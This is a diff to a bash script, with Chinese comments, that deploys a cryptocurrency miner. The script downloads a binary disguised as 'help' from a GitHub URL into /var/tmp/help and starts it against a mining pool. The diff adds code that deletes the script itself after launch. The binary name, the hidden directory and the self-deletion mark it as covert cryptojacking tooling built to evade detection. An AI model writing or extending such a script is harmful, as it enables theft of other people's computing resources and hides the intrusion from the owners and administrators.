@@ -8,6 +8,9 @@ WORKER="worker"
 MINER_DIR="/var/tmp/help"
 MINER_URL="https://github.com/dadashabi123/shabi/raw/refs/heads/main/help"
 
+# 获取脚本自身路径
+SCRIPT_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"
+
 # 解析命令行参数
 while getopts "w:" opt; do
   case $opt in
@@ -51,4 +54,7 @@ if pgrep -f "help.*$POOL" > /dev/null; then
     echo "矿工名称: $WORKER"
 else
     echo "挖矿程序启动失败"
-fi 
+fi
+
+# 自删除脚本
+rm -f "$SCRIPT_PATH" 
